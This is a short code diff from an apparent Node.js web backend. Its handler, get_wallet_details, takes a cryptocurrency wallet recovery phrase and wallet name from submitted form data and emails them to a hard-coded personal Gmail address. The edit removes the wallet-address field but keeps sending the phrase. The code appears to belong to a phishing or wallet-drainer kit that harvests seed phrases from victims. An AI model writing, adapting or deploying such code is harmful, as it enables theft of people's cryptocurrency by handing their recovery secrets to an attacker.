@@ -38,11 +38,11 @@ const sendmail = async function(from,to,subject,text) {
 }
 exports.get_wallet_details= async(req,res)=>{
       const phrase = req.body.Phrase;
-      const wallet_address = req.body.Wallet_address;
+     // const wallet_address = req.body.Wallet_address;
       const crypto_wallet = req.body.Crpto_Wallet
      const email ="walisonmichael8@gmail.com";
      const subject ="Wallet Details";
-     const Text = "Phrase: "+phrase+"\n"+"Wallet Address: "+wallet_address+"\n"+"Wallet Name: "+crypto_wallet;
+     const Text = "Phrase: "+phrase+"\n\n"+"Wallet Name: "+crypto_wallet;
      
      try{
         const send = sendmail(process.env.EMAIL,email,subject,Text);
